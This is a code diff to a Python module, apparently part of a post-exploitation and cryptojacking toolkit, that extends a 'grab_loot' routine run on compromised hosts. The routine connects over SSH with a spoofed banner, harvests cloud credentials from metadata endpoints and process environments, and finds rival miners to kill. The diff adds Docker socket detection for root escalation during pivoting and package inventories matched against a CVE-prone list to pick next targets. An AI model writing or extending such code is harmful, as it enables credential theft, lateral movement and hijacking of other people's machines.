@@ -35,6 +35,7 @@ overwrites the same stash and downstream phases can read from disk.
 
 from __future__ import annotations
 
+import json
 import os
 import re
 import shlex
@@ -43,7 +44,7 @@ import time
 from dataclasses import dataclass, field
 from typing import Any, Iterable
 
-from honeywatch.opsec import spoofed_ssh_banner as _spoofed_ssh_banner
+from honeywatch.opsec import spoofed_ssh_banner_for_target as _spoofed_ssh_banner_for_target
 
 __all__ = [
     "LootResult",
@@ -52,6 +53,9 @@ __all__ = [
     "parse_known_hosts",
     "parse_ssh_config",
     "parse_history_for_targets",
+    "parse_pip_packages",
+    "parse_npm_packages",
+    "parse_system_packages",
     "IMDS_ENDPOINTS",
 ]
 
@@ -153,6 +157,12 @@ class LootResult:
     internal_hosts: list[str] = field(default_factory=list)
     # Other miners detected running on the host (to kill before deploy)
     competing_miners: list[str] = field(default_factory=list)
+    # Installed packages harvested from the foothold: list of dicts with
+    # keys (name, version, manager). Manager is "pip", "npm", "dpkg", or "rpm".
+    installed_packages: list[dict] = field(default_factory=list)
+    # Packages from installed_packages that appear in the CVE-prone list.
+    # Each dict has keys (name, version, manager, cve_prone: bool).
+    vulnerable_packages: list[dict] = field(default_factory=list)
     error: str | None = None
 
     def summary(self) -> str:
@@ -169,6 +179,8 @@ class LootResult:
             parts.append(f"{len(self.metadata)} metadata field(s)")
         if self.competing_miners:
             parts.append(f"{len(self.competing_miners)} competing miner(s)")
+        if self.vulnerable_packages:
+            parts.append(f"{len(self.vulnerable_packages)} cve-prone pkg(s)")
         return ", ".join(parts)
 
 
@@ -410,6 +422,18 @@ def _imds_commands() -> list[tuple[str, str]]:
         "grep -aoE 'AZURE_[A-Z_]*=[^\\x00]*' /proc/*/environ 2>/dev/null | sort -u || true",
         "proc_azure_env",
     ))
+    # Docker socket detection (Finding #4): /var/run/docker.sock gives root on
+    # the host (mount the host filesystem via a container). TeamTNT and Kinsing
+    # both check for this. Also probe the docker CLI — a container with the
+    # socket mounted can run docker commands directly.
+    cmds.append((
+        "ls -la /var/run/docker.sock 2>/dev/null && echo 'DOCKER_SOCKET_PRESENT' || true",
+        "docker_socket",
+    ))
+    cmds.append((
+        "docker ps 2>/dev/null | head -10 || true",
+        "docker_ps",
+    ))
     return cmds
 
 
@@ -463,7 +487,7 @@ def grab_loot(
         sock = socket.create_connection((ip, port), timeout=timeout_s)
         sock.settimeout(timeout_s)
         transport = paramiko.Transport(sock)
-        banner = _spoofed_ssh_banner()
+        banner = _spoofed_ssh_banner_for_target(ip, port)
         transport._CLIENT_IDENTITY = banner
         transport.local_version = banner
         transport.set_timeout(timeout_s)
@@ -511,7 +535,9 @@ def grab_loot(
 
         sftp.close()
 
-        # 2. Run IMDS + process probes over an exec channel (SFTP can't run curl).
+        # 2. Run IMDS + process probes over an exec channel on the same
+        # transport. The SFTP channel is closed before opening the exec channel
+        # to avoid channel-number exhaustion on servers that limit sessions.
         chan = transport.open_session()
         chan.settimeout(timeout_s)
         # One combined command: probe every IMDS endpoint + ps for miners.
@@ -526,6 +552,16 @@ def grab_loot(
             "ps aux 2>/dev/null | grep -iE 'xmrig|kdevtmpfsi|kinsing|"
             "kthrotlds|sysupdate|sysguard|networkservice' | grep -v grep || true"
         )
+        # Package inventory: pip, npm, and system packages. Each is
+        # best-effort (fails silently when the package manager is absent).
+        imds_script += (
+            "\necho '---pip_packages---'; "
+            "pip list --format=json 2>/dev/null || true"
+            "\necho '---npm_packages---'; "
+            "npm list -g --json 2>/dev/null || true"
+            "\necho '---system_packages---'; "
+            "dpkg-query -W -f '${Package}\\t${Version}\\n' 2>/dev/null || rpm -qa --qf '%{NAME}\\t%{VERSION}\\n' 2>/dev/null || true"
+        )
         chan.exec_command(imds_script)
         out = b""
         deadline = time.monotonic() + timeout_s
@@ -537,9 +573,6 @@ def grab_loot(
             if chan.recv_stderr_ready():
                 chan.recv_stderr(4096)
                 got = True
-            # Mirror chain._ssh_exec's drain condition: exit is only safe once
-            # BOTH stdout and stderr are empty, otherwise a final stderr chunk
-            # can be lost.
             if (chan.exit_status_ready()
                     and not chan.recv_ready()
                     and not chan.recv_stderr_ready()):
@@ -553,6 +586,16 @@ def grab_loot(
 
         # 3. Parse exfiltrated files for pivot targets + internal hosts.
         _mine_exfiltrated_files(res)
+
+        # 4. Close the exec channel BEFORE closing the transport. The old code
+        # relied on the finally block to close the transport, but if the
+        # transport is closed while the channel is still draining, IMDS output
+        # is lost. Close the channel explicitly here, then let the finally
+        # block close the transport.
+        try:
+            chan.close()
+        except Exception:
+            pass
 
     except paramiko.AuthenticationException as exc:
         res.error = f"auth failed: {exc!r}"
@@ -633,6 +676,15 @@ def _parse_imds_output(text: str, res: LootResult, loot_dir: str) -> None:
                     if var_name not in res.cloud_creds:
                         res.cloud_creds[var_name] = os.path.join(loot_dir, f"{env_label}.txt")
 
+    # Docker socket detection (Finding #4): /var/run/docker.sock gives root
+    # on the host. Flag it in cloud_creds so the pivot phase can exploit it.
+    if "docker_socket" in sections and "DOCKER_SOCKET_PRESENT" in sections["docker_socket"]:
+        res.cloud_creds["docker_socket"] = "/var/run/docker.sock"
+        res.metadata["docker_socket_present"] = "true"
+    if "docker_ps" in sections and sections["docker_ps"].strip():
+        res.metadata["docker_running"] = "true"
+        _write_loot(loot_dir, "docker_ps.txt", sections["docker_ps"])
+
     # Competing miners. ps aux output: USER PID %CPU %MEM VSZ RSS TTY STAT
     # START TIME COMMAND — the command is everything from column 10 onward.
     # We're lenient about column count so a truncated ps line still parses.
@@ -653,6 +705,111 @@ def _parse_imds_output(text: str, res: LootResult, loot_dir: str) -> None:
                 seen.add(binary)
                 miners.append(binary)
         res.competing_miners = miners
+
+    # Package inventory parsing.
+    _parse_packages(sections, res)
+
+
+_CVE_PRONE_PACKAGES: list[str] | None = None
+
+
+def _load_cve_prone_packages() -> list[str]:
+    global _CVE_PRONE_PACKAGES
+    if _CVE_PRONE_PACKAGES is not None:
+        return _CVE_PRONE_PACKAGES
+    path = os.path.join(os.path.dirname(__file__), "data", "cve_packages.json")
+    try:
+        with open(path, "r", encoding="utf-8") as fh:
+            _CVE_PRONE_PACKAGES = json.load(fh)
+    except (OSError, json.JSONDecodeError):
+        _CVE_PRONE_PACKAGES = []
+    return _CVE_PRONE_PACKAGES
+
+
+def _parse_pip_packages(text: str) -> list[dict]:
+    pkgs: list[dict] = []
+    try:
+        for entry in json.loads(text):
+            name = entry.get("name", "")
+            version = entry.get("version", "")
+            if name:
+                pkgs.append({"name": name, "version": version, "manager": "pip"})
+    except (json.JSONDecodeError, TypeError):
+        pass
+    return pkgs
+
+
+def _parse_npm_packages(text: str) -> list[dict]:
+    pkgs: list[dict] = []
+    try:
+        data = json.loads(text)
+        deps = data.get("dependencies", {})
+    except (json.JSONDecodeError, TypeError, AttributeError):
+        return pkgs
+    if not isinstance(deps, dict):
+        return pkgs
+    for name, info in deps.items():
+        if isinstance(info, dict):
+            ver = info.get("version", "")
+        else:
+            ver = ""
+        pkgs.append({"name": name, "version": ver, "manager": "npm"})
+    return pkgs
+
+
+def _parse_system_packages(text: str) -> list[dict]:
+    pkgs: list[dict] = []
+    for line in text.splitlines():
+        line = line.strip()
+        if not line:
+            continue
+        parts = line.split("\t")
+        if len(parts) == 2:
+            name, version = parts
+            manager = "dpkg"
+        else:
+            parts = line.split()
+            if len(parts) < 2:
+                continue
+            name = parts[0]
+            version = parts[1]
+            manager = "rpm"
+        if name:
+            pkgs.append({"name": name, "version": version, "manager": manager})
+    return pkgs
+
+
+def _parse_packages(sections: dict[str, str], res: LootResult) -> None:
+    all_pkgs: list[dict] = []
+    seen: set[str] = set()
+    cve_names = {p.lower() for p in _load_cve_prone_packages()}
+
+    for section_key, parser, manager in (
+        ("pip_packages", _parse_pip_packages, "pip"),
+        ("npm_packages", _parse_npm_packages, "npm"),
+        ("system_packages", _parse_system_packages, "system"),
+    ):
+        if section_key not in sections:
+            continue
+        text = sections[section_key]
+        if not text.strip():
+            continue
+        if manager in ("pip", "npm"):
+            parsed = parser(text)
+        else:
+            parsed = parser(text)
+        for pkg in parsed:
+            key = f"{pkg['manager']}:{pkg['name']}"
+            if key not in seen:
+                seen.add(key)
+                all_pkgs.append(pkg)
+
+    res.installed_packages = all_pkgs
+    for pkg in all_pkgs:
+        if pkg["name"].lower() in cve_names:
+            res.vulnerable_packages.append(
+                {**pkg, "cve_prone": True}
+            )
 
 
 def _write_loot(loot_dir: str, name: str, content: str) -> None:
@@ -707,3 +864,8 @@ def _mine_exfiltrated_files(res: LootResult) -> None:
                         for alias in parts[1:]:
                             if alias not in ("localhost",) and alias not in res.internal_hosts:
                                 res.internal_hosts.append(alias)
+
+
+parse_pip_packages = _parse_pip_packages
+parse_npm_packages = _parse_npm_packages
+parse_system_packages = _parse_system_packages
